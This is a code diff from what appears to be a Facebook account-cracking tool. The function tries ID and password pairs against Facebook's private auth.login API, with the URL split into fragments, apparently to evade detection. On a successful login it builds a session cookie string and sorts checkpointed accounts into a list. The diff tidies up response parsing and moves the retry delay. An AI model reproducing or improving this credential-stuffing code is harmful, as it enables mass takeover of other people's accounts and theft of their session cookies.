@@ -1199,9 +1199,10 @@ def m4(idf,pwv):
             "X-FB-Server-Cluster": "True",
             'X-FB-HTTP-Engine': 'Liger'}
             url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
-            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).text
-            q = json.loads(po)
-            if 'access_token' in q:
+            response = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True)
+            if response.status_code == 200:
+              q = response.json()
+              if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     uid=str(q['uid'])
                     ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
@@ -1219,9 +1220,9 @@ def m4(idf,pwv):
                             cp.append(idf)
                             break
                     else:
-                       continue
-                    time.sleep(1)
+                       continue    
       loop+=1
+      time.sleep(1)
     except requests.exceptions.ConnectionError:
         time.sleep(10)
     except Exception as e:
